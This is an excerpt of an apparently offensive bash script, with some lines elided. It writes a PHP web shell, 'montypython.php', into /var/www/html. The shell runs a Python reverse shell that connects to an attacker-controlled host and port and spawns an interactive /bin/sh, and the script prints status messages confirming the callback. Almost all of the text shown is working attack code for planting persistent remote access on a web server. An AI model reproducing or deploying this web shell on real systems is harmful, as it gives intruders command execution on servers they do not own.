...
python_webshell="montypython.php"
...
then
	...
	then 
		...
		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
		echo "<?php system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'');?>" > /var/www/html/$python_webshell
		echo -e "\e[92m[+]\e[0m Python reverse shell placed in /var/www/html/$python_webshell"
		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
	fi
